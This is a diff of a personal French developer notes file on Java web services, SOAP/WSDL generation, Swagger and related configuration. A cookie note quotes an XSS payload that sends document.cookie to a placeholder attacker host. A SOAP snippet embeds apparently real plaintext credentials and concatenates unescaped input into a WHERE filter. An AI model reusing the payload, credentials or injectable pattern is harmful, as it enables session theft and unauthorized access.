+voir exemple de webservice rest sans framework ici: d:\Profiles\lduverge\Desktop\Apprentissage\webservicedemo(attention pour l'entite j'ai pas respecte unclebob)
+si erreur java.lang.AbstractMethodError: javax.ws.rs.core.UriBuilder.uri(Ljava/lang/String;)Ljavax/ws/rs/core/UriBuilder
+      c parce que j'utilise pas les bonnes versions de librairies jersey/tomcat je crois. upgrader
+  webservice renvoit une erreur policy? regarder au niveau "Autorisation"
+tutoriel Pour faire des serveurs de webservice: http://www.tutorialspoint.com/restful/restful_first_application.htm
+        webservices: http://users.skynet.be/pascalbotte/
+pour utiliser jersey avec maven pour les webservices: (utilise annotation. Facile. ) 
+          <dependency>
+              	<groupId>com.sun.jersey</groupId>
+              	<artifactId>jersey-server</artifactId>
+              	<version>1.19</version>
+              </dependency>
+              <dependency>
+              	<groupId>com.sun.jersey</groupId>
+              	<artifactId>jersey-client</artifactId>
+              	<version>1.19</version>
+              </dependency>
+              <dependency>
+              	<groupId>org.apache.httpcomponents</groupId>
+              	<artifactId>httpcore</artifactId>
+              	<version>4.4-beta1</version>
+              </dependency>
+              <dependency>
+              	<groupId>org.apache.httpcomponents</groupId>
+              	<artifactId>httpclient</artifactId>
+              	<version>4.4-beta1</version>
+              </dependency>
+              <dependency>
+              	<groupId>org.json</groupId>
+              	<artifactId>json</artifactId>
+              	<version>20141113</version>
+              </dependency>
+               
+SOAP : webservice : webservices :
+a lire    https://javarevisited.blogspot.com/2017/02/difference-between-jax-rs-restlet-jersey-apache-cfx-RESTEasy.html
+http://ws.apache.org/axis/java/user-guide.html
+voir l'outil Soap Ui soapui bien pratique (dans installations)
+utilise WSDL (le serveur donne au client un wsdl pour qu'il puisse appeller ses methodes) Pour voir les details d'un webservice avec wsdl: http://172.18.68.129:10512/hr-ws/services?wsdl (?wsdl à la fin) existe aussi Spring-WS
+pour generer le wsdl a la main:
+          se placer dans le repertoire classes et faire:
+          "C:\Program Files\Java\jdk1.6.0_24\bin\wsgen" -verbose -keep -cp . com.test.TestSessionBeanBean -wsdl // ou com.test.TestSessionBeanBean  est une classe contenant anotation @WebService(et @Statefull si c un EJB aussi) et @WebMethod au niveau des meths
+           cette classe doit implementer une interface qui est annotee de @WebService  et @WebMethod de la meme facon. 
+          il va generer le wsdl et le xsd sous classes
+pour generer java a partir de wsdl mais beurk: 
+      "C:\Program Files\Java\jdk1.6.0_24\bin\wsimport" TestWebServiceBeanService.wsdl -verbose -keep -d repertoireOuGenererLeCodeSource
+ pour generer java à partir de wsdl via maven: creer un projet maven avec le pom:
+                                <?xml version="1.0" encoding="UTF-8"?>
+                              <project xmlns="http://maven.apache.org/POM/4.0.0"
+                                       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+                                       xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+                                  <modelVersion>4.0.0</modelVersion> // obligatoire 4.0.0 correspond à maven 3 ou 4 sais pas.. c utile si j'utilise une nouvelle version de maven
+                              
+                                  <groupId>com.soprahr.edsn.webservice.soap</groupId>
+                                  <artifactId>cdcgide</artifactId>
+                                  <version>1.0</version>
+                              <build>
+                              <plugins>
+                                  <plugin>
+                                      <groupId>org.jvnet.jaxb2.maven2</groupId> avant:	<groupId>com.sun.tools.xjc.maven2</groupId>  ou:<groupId>org.apache.cxf</groupId>
+                                      <artifactId>maven-jaxb2-plugin</artifactId> avant: 	<artifactId>maven-jaxb-plugin</artifactId> ou <artifactId>cxf-codegen-plugin</artifactId>
+                                      <version>0.13.1</version>
+                                      <executions>
+                                          <execution>
+                                              <goals>
+                                                  <goal>generate</goal>
+                                              </goals>
+                                          </execution>
+                                      </executions>
+                                  </plugin>
+                              </plugins>
+                              </build>
+                              </project>
+                 deposer dans resources mes .wsdl (et .xsd facultatif) et faire mvn package (ou bien mvn clean generate-sources?): ca cree un jar pour le webservice.     
+         autre methode avec une autre librairie pour generer le java à partir du wsdl: voir la doc D:\Projets\CDC\Guide mise en oeuvre web service JAXWS-1.7.pdf au bon chapitre:Developpement d'un client web service conforme JAX-WS
+                                  <plugin>
+                                              <groupId>org.jvnet.jax-ws-commons</groupId>
+                                              <artifactId>jaxws-maven-plugin</artifactId>
+                                               <version>${jaxws.plugin.version}</version>
+                                              <executions>
+                                                  <execution>
+                                                      <goals>
+                                                          <goal>wsimport</goal>
+                                                      </goals>
+                                                  </execution>
+                                              </executions>
+                                              <configuration>
+                                                   <bindingDirectory>${basedir}/src/main/resources/META-INF/wsdl</bindingDirectory>
+                                                  <bindingFiles>
+                                                       <bindingFile>xsd-binding.xml</bindingFile>
+                                                       <bindingFile>wsdl-binding.xml</bindingFile>
+                                                  </bindingFiles>
+                                                   <sourceDestDir>${basedir}/src/main/java</sourceDestDir>
+                                                   <wsdlDirectory>${basedir}/src/main/resources/META-INF/wsdl</wsdlDirectory>
+                                                  <wsdlFiles>
+                                                       <wsdlFile>Gide.wsdl</wsdlFile>
+                                                  </wsdlFiles>
+                                                  <wsdlLocation>/META-INF/wsdl/Gide.wsdl</wsdlLocation>
+                                                  <xnocompile>true</xnocompile>
+                                              </configuration>
+                                              <dependencies>
+                                                  <dependency>
+                                                      <groupId>com.sun.xml.ws</groupId>
+                                                      <artifactId>jaxws-tools</artifactId>
+                                                      <version>2.2.5</version>
+                                                  </dependency>
+                                              </dependencies>
+                                          </plugin>
+    pour appeler le webservice:
+		URL url = new URL("http://su340ars.mc2.renault.fr:17051/ewf_wsv/services/GRMLoadNewRequest");
+		GRMLoadNewRequestServiceLocator locator = new GRMLoadNewRequestServiceLocator();
+			GRMLoadNewRequest proxy = locator.getGRMLoadNewRequest(url);... a terminer a faire
+           con c'est soit
+           HttpsURLConnection con
+           soit 
+           URLConnection  con = (URLConnection) url.openConnection(); ou HttpsURLConnection (voir SSL) 
+             con.setConnectTimeout(60*1000);
+             con.setReadTimeout(60*1000);
+             con.setDoInput(true);
+             con.setDoOutput(true);
+             con.setRequestMethod("POST");
+             // Headers standard pour un appel SOAP.
+             //con.setRequestProperty("Accept-Encoding", "gzip,deflate");
+             con.setRequestProperty("Content-Type", "text/xml;charset=" + charset); // charset = UTF-8. facultatif
+             con.setRequestProperty("SOAPAction", "urn:ip_subnet_list");
+             // Authentification. Classique base64 de "login:password".
+             //con.setRequestProperty("Authorization", "Basic cDA2NjYxODpwMXNzd29yZA==");
+             //System.setProperty("jsse.enableSNIExtension", "false");
+             // Ma requête SOAP, merci SOAP-UI et le WSDL.
+             String reqXML = "";
+             reqXML += "<soapenv:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:urn='urn:IPM_SOAP'>";
+             reqXML += "<soapenv:Header/>";
+             reqXML += "<soapenv:Body>";
+             reqXML += "<urn:ip_subnet_list soapenv:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'>";
+             reqXML += "<input xsi:type='urn:ip_subnet_list_in' xmlns:urn='urn:IPM'>";
+             //reqXML += "<!--You may enter the following 7 items in any order-->";
+             reqXML += "<auth_login xsi:type='xsd:string'>awcmdb0</auth_login>";
+             reqXML += "<auth_password xsi:type='xsd:string'>42tzo7r</auth_password>";
+             reqXML += "<WHERE xsi:type='xsd:string'>subnet_name like '"+subnetFilter+"' and subnet_class_parameters like '%rn_network_usage="+rnNetworkUsage+"%' and subnet_class_parameters like '%rn_site="+rnSite+"%'</WHERE>";
+             reqXML += "<ORDERBY xsi:type='xsd:string'>subnet_name ASC</ORDERBY>";
+             /* reqXML += "<!--Optional:-->";
+             reqXML += "<OPT_SELECT xsi:type='xsd:string'>?</OPT_SELECT>";
+             reqXML += "<!--Optional:-->";
+             reqXML += "<WHERE xsi:type='xsd:string'>?</WHERE>";
+             reqXML += "<!--Optional:-->";
+             reqXML += "<ORDERBY xsi:type='xsd:string'>?</ORDERBY>";
+             reqXML += "<!--Optional:-->";
+             reqXML += "<limit xsi:type="xsd:string">?</limit>";
+             reqXML += "<!--Optional:-->";
+             reqXML += "<offset xsi:type='xsd:string'>?</offset>"*/;
+             reqXML += " </input>";
+             reqXML += "</urn:ip_subnet_list>";
+             reqXML += "</soapenv:Body>";
+             reqXML += "</soapenv:Envelope>";
+             
+             // On envoit la requête
+             envoyer requete:LINKrequ939302                                        
+             OutputStream reqStream = con.getOutputStream(); ou OutputStreamWriter wr = new OutputStreamWriter(con.getOutputStream());
+             reqStream.write(reqXML.getBytes());             ou wr.write( "user="+user); puis wr.flush();
+             // On recupere la reponse
+             //log.error("getInputStream");
+             InputStream reqResponse = con.getInputStream();
+             // Ici le code HTTP de la reponse, normalement 200 si tout est OK
+             int status = con.getResponseCode();
+             //log.error("HTTP Status " +status);
+             // On va recup l'ensemble de la reponse ligne par ligne et coller ça dans une variable texte
+             String respXML = "";
+             BufferedReader reader = null;
+             try {
+                 reader = new BufferedReader(new InputStreamReader(reqResponse, charset));
+             	reader.readLine(); // ignore the first  <?xml version="1.0" encoding="UTF-8"?> line
+                 for (String line; (line = reader.readLine()) != null;) {
+             		respXML += line ;
+             		//log.error("respXML = "+respXML);
+                 }
+             } finally {
+                 if (reader != null) try { reader.close(); } catch (IOException logOrIgnore) {}
+             }
+swagger : pour qu'un webservice rest(je pense) exposer ses methodes dans une page html wsdl LINKSWAGGER
+        concurrent = raml. Voir LINKsqlkfjjjhjhjhjhjhjhj
+        pour SPRING: 
+      http://localhost:8081/SpringRestEx/rest/v2/api-docs
+      pour que swagger fonctionne j'ai rajoute les dependances dans pom.xml
+          <!-- swagger -->
+            <dependency>
+              <groupId>io.springfox</groupId>
+              <artifactId>springfox-swagger2</artifactId>
+              <version>2.4.0</version>
+            </dependency>
+            <dependency>
+              <groupId>io.springfox</groupId>
+              <artifactId>springfox-swagger-ui</artifactId>
+              <version>2.4.0</version>
+            </dependency>
+       et la classe de configuration spring: SwaggerConfig ci dessous
+                    @Configuration
+                    @EnableSwagger2
+                    public class SwaggerConfig
+                    {
+                            @Bean
+                            public Docket api() {
+                                return new Docket(DocumentationType.SWAGGER_2)
+                                        .select()
+                                        .apis(RequestHandlerSelectors.any())
+                                        .paths(PathSelectors.any())
+                                        .build();
+                            }
+                    }
+                    copier le json genere par http://localhost:8081/sma-ws/rest/v2/api-docs
+       
+        pour JEE:
+        <plugin>
+                <groupId>com.sebastian-daschner</groupId>
+                <artifactId>jaxrs-analyzer-maven-plugin</artifactId>
+                <version>0.17</version>
+                <executions>
+                    <execution>
+                        <goals>
+                            <goal>analyze-jaxrs</goal>
+                        </goals>
+                        <configuration>
+                            <!-- Available backends are plaintext (default), swagger and asciidoc markdown(API Blue Print:https://apiblueprint.org/) -->
+                            <backend>swagger</backend>
+                            <ignoredBoundaryClasses>com.domain.foo.boundary.internal.Employees,com.domain.foo.boundary.internal.Salary</ignoredBoundaryClasses>
+                            <!-- Domain of the deployed project, defaults to "" -->
+                            <deployedDomain>example.com</deployedDomain>
+                            <!-- Comma separated list of Swagger schemes (only for if backend is swagger, defaults to http) -->
+                            <swaggerSchemes>https,http</swaggerSchemes>
+                            <!-- Enables rendering of Swagger tags (defaults to false -> default tag will be used) -->
+                            <renderSwaggerTags>true</renderSwaggerTags>
+                            <!-- The number at which path position the Swagger tags will be extracted (defaults to 0) -->
+                            <swaggerTagsPathOffset>1</swaggerTagsPathOffset>
+                            <!-- Directory (relative to buildDir) where resources will be generated (defaults to jaxrs-analyzer) -->
+                            <resourcesDir>jaxrs-analyzer3</resourcesDir>
+                        </configuration>
+                    </execution>
+                </executions>
+            </plugin>
+            executer le puggin maven et c'est bonnard.            
+
 faire un chat : websocket :
 Pour faire un serveur serveur de chat etc... fonctionnement des sockets
  ServerSocket listener = new ServerSocket(PORT);  // THIS, ecoute sur le port numero PORT. (le programme continue) ce port est désormais reservé. Plusieurs client peuvent communiquer avec THIS et pour chaque client qui se connecte un Socket different est attribué sur ce port.
@@ -2595,7 +2855,7 @@ quarkus : def: arc c'est CDI=Contexts and Dependency Injection: https://quarkus.
             	@Context
             	HttpServletResponse httpResponse;
 
-                @Path("/la_suite_de_lurl") ou @Path("/") // facultatif 
+                @Path("/la_suite_de_lurl") ou @Path("/") // facultatif ou @Path("/{a:api/v1/realtimepath|api/v2/apps/{appNameId}/realtimepath") //si j'ai plusieurs multiples urls 
                 public interface ou une classe FeaturesRestService { /// TRES IMPORTANT: la methode doit etre public sinon il ne la voit pas
                   /**
                   * Returns an explicit collection of all features in XML format in response to HTTP GET requests.
@@ -3094,18 +3354,7 @@ autre facon PROPRE(pas de pb encodage) de faire un download a partir de l'objet 
 						fos.write(fileContent);
 						fos.close();	    
 			
-Autre facon de faire le download:
-		  ByteArrayOutputStream lByteOut = new ByteArrayOutputStream();
-				BufferedOutputStream lOut = new BufferedOutputStream(lByteOut);
-				lOut.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
-				lOut.close();
-				
-				OutputStream os = response.getOutputStream();
-				PdfWriter.getInstance(document, lOut);
-				os.write(lByteOut.toByteArray());
-				os.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
-				os.close();
-				
+
   recuperer un cookie a partir du request: affichier la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
                       Cookie[] cookies = request.getCookies();
                         String cookieName = SAPCookie;
@@ -4846,7 +5095,7 @@ AILLEURS: injecter mes beans par constructeur
           
                              
 Spring : XML STYLE                                                                      
-      DelegatingFilterProxy :                                                           
+      DelegatingFilterProxy:                                                           
           web.xml :
             <filter>
         		<filter-name>samlResponseFilter</filter-name>
@@ -4921,7 +5170,7 @@ Spring : XML STYLE
                   ou
                   <url-pattern>*.html</url-pattern> <!-- et la un controlleur /toto sera appele en mettant /toto.html avec extension .html dans le navigateur -->
           </servlet-mapping>
-                DelegatingFilterProxy : filtre
+                DelegatingFilterProxy: filtre
             <filter>
           		<filter-name>samlResponseFilter</filter-name>
           		<filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
@@ -17307,44 +17556,7 @@ pour imposer qu'il ya  qu'une seule instance de mon batch java qui tourne:
 
        
 
-microservices :
-    bonnes pratiques
-        dans le cadre de microservices il faut qu'il y ait qun seul entrypoint point de départ de l'histoire et les liens renvoyés par les webservices respectant la norme HATEOAS permettent de savoir quelles autres urls je peux appeler.
-webservice : webservices : voir LINKSWAGGER 
-    UDDI est un annuaire des webservices sur internet
-REST : webservice : webservices : client accède à un service à partir d'un URL et recoit en reponse json ou jpg ou plain text ou meme xml etc (meta-data dedans indique quoi) n'est pas forcement du http. Ca peut etre un websocket
-voir exemple de webservice rest sans framework ici: d:\Profiles\lduverge\Desktop\Apprentissage\webservicedemo(attention pour l'entite j'ai pas respecte unclebob)
-si erreur java.lang.AbstractMethodError: javax.ws.rs.core.UriBuilder.uri(Ljava/lang/String;)Ljavax/ws/rs/core/UriBuilder
-      c parce que j'utilise pas les bonnes versions de librairies jersey/tomcat je crois. upgrader
-  webservice renvoit une erreur policy? regarder au niveau "Autorisation"
-tutoriel Pour faire des serveurs de webservice: http://www.tutorialspoint.com/restful/restful_first_application.htm
-        webservices: http://users.skynet.be/pascalbotte/
-pour utiliser jersey avec maven pour les webservices: (utilise annotation. Facile. ) 
-          <dependency>
-              	<groupId>com.sun.jersey</groupId>
-              	<artifactId>jersey-server</artifactId>
-              	<version>1.19</version>
-              </dependency>
-              <dependency>
-              	<groupId>com.sun.jersey</groupId>
-              	<artifactId>jersey-client</artifactId>
-              	<version>1.19</version>
-              </dependency>
-              <dependency>
-              	<groupId>org.apache.httpcomponents</groupId>
-              	<artifactId>httpcore</artifactId>
-              	<version>4.4-beta1</version>
-              </dependency>
-              <dependency>
-              	<groupId>org.apache.httpcomponents</groupId>
-              	<artifactId>httpclient</artifactId>
-              	<version>4.4-beta1</version>
-              </dependency>
-              <dependency>
-              	<groupId>org.json</groupId>
-              	<artifactId>json</artifactId>
-              	<version>20141113</version>
-              </dependency> 
+
 parser convertir json :
 pour convertir un string objet java en array json meme si l'array a plusieurs niveau:
                 avec jackson avec controle du mapping
@@ -17934,150 +18146,19 @@ VIEILLE METHODE. Depuis java 5 ou 6 ca ne marche plus car on utilise plus apache
              // pour faire une requete xpath: 
              NodeIterator  nl = XPathAPI.selectNodeIterator(document, "mon xpath!");
 
-SOAP : webservice : webservices :
-a lire    https://javarevisited.blogspot.com/2017/02/difference-between-jax-rs-restlet-jersey-apache-cfx-RESTEasy.html
-http://ws.apache.org/axis/java/user-guide.html
-voir l'outil Soap Ui soapui bien pratique (dans installations)
-utilise WSDL (le serveur donne au client un wsdl pour qu'il puisse appeller ses methodes) Pour voir les details d'un webservice avec wsdl: http://172.18.68.129:10512/hr-ws/services?wsdl (?wsdl à la fin) existe aussi Spring-WS
-pour generer le wsdl a la main:
-          se placer dans le repertoire classes et faire:
-          "C:\Program Files\Java\jdk1.6.0_24\bin\wsgen" -verbose -keep -cp . com.test.TestSessionBeanBean -wsdl // ou com.test.TestSessionBeanBean  est une classe contenant anotation @WebService(et @Statefull si c un EJB aussi) et @WebMethod au niveau des meths
-           cette classe doit implementer une interface qui est annotee de @WebService  et @WebMethod de la meme facon. 
-          il va generer le wsdl et le xsd sous classes
-pour generer java a partir de wsdl mais beurk: 
-      "C:\Program Files\Java\jdk1.6.0_24\bin\wsimport" TestWebServiceBeanService.wsdl -verbose -keep -d repertoireOuGenererLeCodeSource
- pour generer java à partir de wsdl via maven: creer un projet maven avec le pom:
-                                <?xml version="1.0" encoding="UTF-8"?>
-                              <project xmlns="http://maven.apache.org/POM/4.0.0"
-                                       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-                                       xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
-                                  <modelVersion>4.0.0</modelVersion> // obligatoire 4.0.0 correspond à maven 3 ou 4 sais pas.. c utile si j'utilise une nouvelle version de maven
-                              
-                                  <groupId>com.soprahr.edsn.webservice.soap</groupId>
-                                  <artifactId>cdcgide</artifactId>
-                                  <version>1.0</version>
-                              <build>
-                              <plugins>
-                                  <plugin>
-                                      <groupId>org.jvnet.jaxb2.maven2</groupId> avant:	<groupId>com.sun.tools.xjc.maven2</groupId>  ou:<groupId>org.apache.cxf</groupId>
-                                      <artifactId>maven-jaxb2-plugin</artifactId> avant: 	<artifactId>maven-jaxb-plugin</artifactId> ou <artifactId>cxf-codegen-plugin</artifactId>
-                                      <version>0.13.1</version>
-                                      <executions>
-                                          <execution>
-                                              <goals>
-                                                  <goal>generate</goal>
-                                              </goals>
-                                          </execution>
-                                      </executions>
-                                  </plugin>
-                              </plugins>
-                              </build>
-                              </project>
-                 deposer dans resources mes .wsdl (et .xsd facultatif) et faire mvn package (ou bien mvn clean generate-sources?): ca cree un jar pour le webservice.     
-         autre methode avec une autre librairie pour generer le java à partir du wsdl: voir la doc D:\Projets\CDC\Guide mise en oeuvre web service JAXWS-1.7.pdf au bon chapitre:Developpement d'un client web service conforme JAX-WS
-                                  <plugin>
-                                              <groupId>org.jvnet.jax-ws-commons</groupId>
-                                              <artifactId>jaxws-maven-plugin</artifactId>
-                                               <version>${jaxws.plugin.version}</version>
-                                              <executions>
-                                                  <execution>
-                                                      <goals>
-                                                          <goal>wsimport</goal>
-                                                      </goals>
-                                                  </execution>
-                                              </executions>
-                                              <configuration>
-                                                   <bindingDirectory>${basedir}/src/main/resources/META-INF/wsdl</bindingDirectory>
-                                                  <bindingFiles>
-                                                       <bindingFile>xsd-binding.xml</bindingFile>
-                                                       <bindingFile>wsdl-binding.xml</bindingFile>
-                                                  </bindingFiles>
-                                                   <sourceDestDir>${basedir}/src/main/java</sourceDestDir>
-                                                   <wsdlDirectory>${basedir}/src/main/resources/META-INF/wsdl</wsdlDirectory>
-                                                  <wsdlFiles>
-                                                       <wsdlFile>Gide.wsdl</wsdlFile>
-                                                  </wsdlFiles>
-                                                  <wsdlLocation>/META-INF/wsdl/Gide.wsdl</wsdlLocation>
-                                                  <xnocompile>true</xnocompile>
-                                              </configuration>
-                                              <dependencies>
-                                                  <dependency>
-                                                      <groupId>com.sun.xml.ws</groupId>
-                                                      <artifactId>jaxws-tools</artifactId>
-                                                      <version>2.2.5</version>
-                                                  </dependency>
-                                              </dependencies>
-                                          </plugin>
-    pour appeler le webservice:
-		URL url = new URL("http://su340ars.mc2.renault.fr:17051/ewf_wsv/services/GRMLoadNewRequest");
-		GRMLoadNewRequestServiceLocator locator = new GRMLoadNewRequestServiceLocator();
-			GRMLoadNewRequest proxy = locator.getGRMLoadNewRequest(url);... a terminer a faire
-           con c'est soit
-           HttpsURLConnection con
-           soit 
-           URLConnection  con = (URLConnection) url.openConnection(); ou HttpsURLConnection (voir SSL) 
-             con.setConnectTimeout(60*1000);
-             con.setReadTimeout(60*1000);
-             con.setDoInput(true);
-             con.setDoOutput(true);
-             con.setRequestMethod("POST");
-             // Headers standard pour un appel SOAP.
-             //con.setRequestProperty("Accept-Encoding", "gzip,deflate");
-             con.setRequestProperty("Content-Type", "text/xml;charset=" + charset); // charset = UTF-8. facultatif
-             con.setRequestProperty("SOAPAction", "urn:ip_subnet_list");
-             // Authentification. Classique base64 de "login:password".
-             //con.setRequestProperty("Authorization", "Basic cDA2NjYxODpwMXNzd29yZA==");
-             //System.setProperty("jsse.enableSNIExtension", "false");
-             // Ma requête SOAP, merci SOAP-UI et le WSDL.
-             String reqXML = "";
-             reqXML += "<soapenv:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:urn='urn:IPM_SOAP'>";
-             reqXML += "<soapenv:Header/>";
-             reqXML += "<soapenv:Body>";
-             reqXML += "<urn:ip_subnet_list soapenv:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'>";
-             reqXML += "<input xsi:type='urn:ip_subnet_list_in' xmlns:urn='urn:IPM'>";
-             //reqXML += "<!--You may enter the following 7 items in any order-->";
-             reqXML += "<auth_login xsi:type='xsd:string'>awcmdb0</auth_login>";
-             reqXML += "<auth_password xsi:type='xsd:string'>42tzo7r</auth_password>";
-             reqXML += "<WHERE xsi:type='xsd:string'>subnet_name like '"+subnetFilter+"' and subnet_class_parameters like '%rn_network_usage="+rnNetworkUsage+"%' and subnet_class_parameters like '%rn_site="+rnSite+"%'</WHERE>";
-             reqXML += "<ORDERBY xsi:type='xsd:string'>subnet_name ASC</ORDERBY>";
-             /* reqXML += "<!--Optional:-->";
-             reqXML += "<OPT_SELECT xsi:type='xsd:string'>?</OPT_SELECT>";
-             reqXML += "<!--Optional:-->";
-             reqXML += "<WHERE xsi:type='xsd:string'>?</WHERE>";
-             reqXML += "<!--Optional:-->";
-             reqXML += "<ORDERBY xsi:type='xsd:string'>?</ORDERBY>";
-             reqXML += "<!--Optional:-->";
-             reqXML += "<limit xsi:type="xsd:string">?</limit>";
-             reqXML += "<!--Optional:-->";
-             reqXML += "<offset xsi:type='xsd:string'>?</offset>"*/;
-             reqXML += " </input>";
-             reqXML += "</urn:ip_subnet_list>";
-             reqXML += "</soapenv:Body>";
-             reqXML += "</soapenv:Envelope>";
-             
-             // On envoit la requête
-             envoyer requete:LINKrequ939302                                        
-             OutputStream reqStream = con.getOutputStream(); ou OutputStreamWriter wr = new OutputStreamWriter(con.getOutputStream());
-             reqStream.write(reqXML.getBytes());             ou wr.write( "user="+user); puis wr.flush();
-             // On recupere la reponse
-             //log.error("getInputStream");
-             InputStream reqResponse = con.getInputStream();
-             // Ici le code HTTP de la reponse, normalement 200 si tout est OK
-             int status = con.getResponseCode();
-             //log.error("HTTP Status " +status);
-             // On va recup l'ensemble de la reponse ligne par ligne et coller ça dans une variable texte
-             String respXML = "";
-             BufferedReader reader = null;
-             try {
-                 reader = new BufferedReader(new InputStreamReader(reqResponse, charset));
-             	reader.readLine(); // ignore the first  <?xml version="1.0" encoding="UTF-8"?> line
-                 for (String line; (line = reader.readLine()) != null;) {
-             		respXML += line ;
-             		//log.error("respXML = "+respXML);
-                 }
-             } finally {
-                 if (reader != null) try { reader.close(); } catch (IOException logOrIgnore) {}
-             }
+
+Autre facon de faire le download:
+		  ByteArrayOutputStream lByteOut = new ByteArrayOutputStream();
+				BufferedOutputStream lOut = new BufferedOutputStream(lByteOut);
+				lOut.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
+				lOut.close();
+				
+				OutputStream os = response.getOutputStream();
+				PdfWriter.getInstance(document, lOut);
+				os.write(lByteOut.toByteArray());
+				os.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
+				os.close();
+				
 java ftp :                                                                        
 recuperer un fichier par ftp: (ftpbean est une classe de francois qui herite de FTPClient de apache)
   pour recuperer en anonymous mettre tout simplement user="anonymous" password=""
@@ -19358,6 +19439,7 @@ fonctionnement des annotations :
               ...
               }
               ailleurs
+              @NameBinding // AFAIRE.. c'est quoi?
               @Inherited //facultatif. SI je met ça alors les sous classes de la classe annotée se comporteront comme leur classe parente annotée
               @Constraint (validatedBy=ClasseContenantLeCodeDeMonValidateurBean.class) //facultatif. Mais si on l'utilise voir LINKannotconstraintvalidator
               @Target ({ElementType.METHOD, ElementType.FIELD...}) //obligatoire.  ElementType.ENTITY (c'est pour une anotation d'une classe); ElementType.TYPE pour les interfaces ou les classes ; ElementType.CONSTRUCTOR: se metra donc seulement au dessus du constructeur d'une classe
@@ -25330,6 +25412,7 @@ proxy :et reverse proxy :
             # Specifique AUCHAN pour SSO CAS (mettre les -D avant le -jar si j'execute un programme. Sur tomcat ceci se met dans setenv.sh)
               JAVA_OPTS="$JAVA_OPTS"" -Dhttps.proxyHost=FRSOPSLINFV01"
               JAVA_OPTS="$JAVA_OPTS"" -Dhttps.proxyPort=8080"
+              JAVA_OPTS="$JAVA_OPTS"" -Dhttps.nonProxy(ou un truc comme ça)=url1|url2.... quand j'appelle ces URL alors je ne passe pas par le proxy.
   
                        
 
@@ -32035,67 +32118,6 @@ raml : pour générer depuis un webservice java une doc raml et vice versa avec 
                     </execution>
                 </executions>
             </plugin>              
-swagger : pour qu'un webservice rest(je pense) exposer ses methodes dans une page html wsdl LINKSWAGGER
-        concurrent = raml. Voir LINKsqlkfjjjhjhjhjhjhjhj
-        pour SPRING: 
-      http://localhost:8081/SpringRestEx/rest/v2/api-docs
-      pour que swagger fonctionne j'ai rajoute les dependances dans pom.xml
-          <!-- swagger -->
-            <dependency>
-              <groupId>io.springfox</groupId>
-              <artifactId>springfox-swagger2</artifactId>
-              <version>2.4.0</version>
-            </dependency>
-            <dependency>
-              <groupId>io.springfox</groupId>
-              <artifactId>springfox-swagger-ui</artifactId>
-              <version>2.4.0</version>
-            </dependency>
-       et la classe de configuration spring: SwaggerConfig ci dessous
-                    @Configuration
-                    @EnableSwagger2
-                    public class SwaggerConfig
-                    {
-                            @Bean
-                            public Docket api() {
-                                return new Docket(DocumentationType.SWAGGER_2)
-                                        .select()
-                                        .apis(RequestHandlerSelectors.any())
-                                        .paths(PathSelectors.any())
-                                        .build();
-                            }
-                    }
-                    copier le json genere par http://localhost:8081/sma-ws/rest/v2/api-docs
-       
-        pour JEE:
-        <plugin>
-                <groupId>com.sebastian-daschner</groupId>
-                <artifactId>jaxrs-analyzer-maven-plugin</artifactId>
-                <version>0.17</version>
-                <executions>
-                    <execution>
-                        <goals>
-                            <goal>analyze-jaxrs</goal>
-                        </goals>
-                        <configuration>
-                            <!-- Available backends are plaintext (default), swagger and asciidoc markdown(API Blue Print:https://apiblueprint.org/) -->
-                            <backend>swagger</backend>
-                            <ignoredBoundaryClasses>com.domain.foo.boundary.internal.Employees,com.domain.foo.boundary.internal.Salary</ignoredBoundaryClasses>
-                            <!-- Domain of the deployed project, defaults to "" -->
-                            <deployedDomain>example.com</deployedDomain>
-                            <!-- Comma separated list of Swagger schemes (only for if backend is swagger, defaults to http) -->
-                            <swaggerSchemes>https,http</swaggerSchemes>
-                            <!-- Enables rendering of Swagger tags (defaults to false -> default tag will be used) -->
-                            <renderSwaggerTags>true</renderSwaggerTags>
-                            <!-- The number at which path position the Swagger tags will be extracted (defaults to 0) -->
-                            <swaggerTagsPathOffset>1</swaggerTagsPathOffset>
-                            <!-- Directory (relative to buildDir) where resources will be generated (defaults to jaxrs-analyzer) -->
-                            <resourcesDir>jaxrs-analyzer3</resourcesDir>
-                        </configuration>
-                    </execution>
-                </executions>
-            </plugin>
-            executer le puggin maven et c'est bonnard.            
        
        le transformer en Yaml et en doc 
        le top: http://editor.swagger.io/ sinon trouver un convertisseur en ligne:https://www.json2yaml.com/
